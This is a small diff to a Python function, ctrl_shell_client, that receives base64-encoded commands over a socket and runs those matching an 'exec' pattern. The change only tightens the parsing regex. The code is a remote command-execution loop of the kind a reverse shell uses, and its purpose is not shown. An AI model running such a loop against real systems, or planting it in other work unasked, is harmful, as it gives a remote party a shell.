@@ -45,7 +45,7 @@ def ctrl_shell_client(host, port):
         inp = base64.b64decode(sockrecv(s))
         if inp == 'fin':
             break
-        elif re.search('^exec (".+"\ )+$', inp + ' '):
+        elif re.search('^exec ("[^"]+"\ )+$', inp + ' '):
             ctrl_shell_exec(s, inp)
     s.close()
 
